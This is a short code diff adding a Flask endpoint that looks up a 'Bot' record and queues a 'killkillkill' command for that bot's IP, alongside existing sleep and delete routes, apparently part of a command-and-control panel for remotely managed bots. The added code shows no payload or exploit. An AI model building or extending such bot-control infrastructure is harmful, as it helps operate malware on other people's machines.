@@ -80,6 +80,15 @@ def api_clients_sleep(id):
     db.session.commit()
     return "", 200
 
+@app.route("/api/clients/kill/<int:id>")
+@login_required
+def api_clients_kill(id):
+    try:
+        bot = Bot.query.filter_by(id=id).one()
+    except: return "", 500
+    g.queue[bot.ip].append("killkillkill")
+    return "", 200
+
 @app.route("/api/clients/delete/<int:id>")
 @login_required
 def api_clients_delete(id):
